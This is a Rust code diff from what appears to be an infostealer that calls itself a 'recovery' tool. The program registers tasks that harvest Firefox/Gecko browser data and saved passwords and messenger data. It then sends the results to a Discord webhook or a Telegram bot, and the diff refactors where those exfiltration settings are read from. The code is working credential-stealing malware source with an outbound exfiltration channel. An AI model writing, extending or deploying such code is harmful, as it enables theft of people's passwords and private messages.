@@ -1,7 +1,6 @@
 mod build_config;
 mod formatter;
 mod recovery;
-mod secure_blob;
 mod sender;
 
 use recovery::structured::{
@@ -36,19 +35,7 @@ async fn main() -> Result<(), RecoveryError> {
     );
 
     let mut manager = RecoveryManager::with_default_browser_tasks(&context).await?;
-    match secure_blob::SecretBlob::decrypt() {
-        Ok(blob) => {
-            let preview = blob.preview(8);
-            tracing::info!(
-                blob_len = blob.len(),
-                marker = %blob.marker(),
-                preview = %preview,
-                "secure blob decrypted"
-            );
-            drop(blob);
-        }
-        Err(err) => tracing::warn!(error = %err, "secure blob unavailable"),
-    }
+    
     manager.register_tasks(gecko::gecko_tasks(&context));
     manager.register_tasks(gecko_passwords::gecko_password_tasks(&context));
     manager.register_tasks(services::messenger_tasks(&context));
@@ -104,17 +91,20 @@ async fn main() -> Result<(), RecoveryError> {
 
 async fn send_outcomes(outcomes: &[RecoveryOutcome]) -> Result<(), Box<dyn std::error::Error>> {
     use formatter::MessageFormatter;
+    use recovery::settings::RecoveryControl;
     use sender::{ChatId, DiscordSender, Sender, TelegramSender};
-    use std::env;
     use tokio::fs;
 
-    let sender = if let Ok(webhook) = env::var("IXODES_DISCORD_WEBHOOK") {
-        Sender::Discord(DiscordSender::new(webhook))
-    } else if let Ok(token) = env::var("IXODES_TELEGRAM_TOKEN") {
-        let chat_id = env::var("IXODES_CHAT_ID")
+    let control = RecoveryControl::global();
+
+    let sender = if let Some(webhook) = control.discord_webhook() {
+        Sender::Discord(DiscordSender::new(webhook.to_string()))
+    } else if let Some(token) = control.telegram_token() {
+        let chat_id = control
+            .telegram_chat_id()
             .map(ChatId::from)
-            .unwrap_or_else(|_| ChatId::from(0));
-        Sender::Telegram(TelegramSender::new(token), chat_id)
+            .unwrap_or_else(|| ChatId::from(0));
+        Sender::Telegram(TelegramSender::new(token.to_string()), chat_id)
     } else {
         tracing::warn!(
             "no sender configuration found (IXODES_DISCORD_WEBHOOK or IXODES_TELEGRAM_TOKEN)"
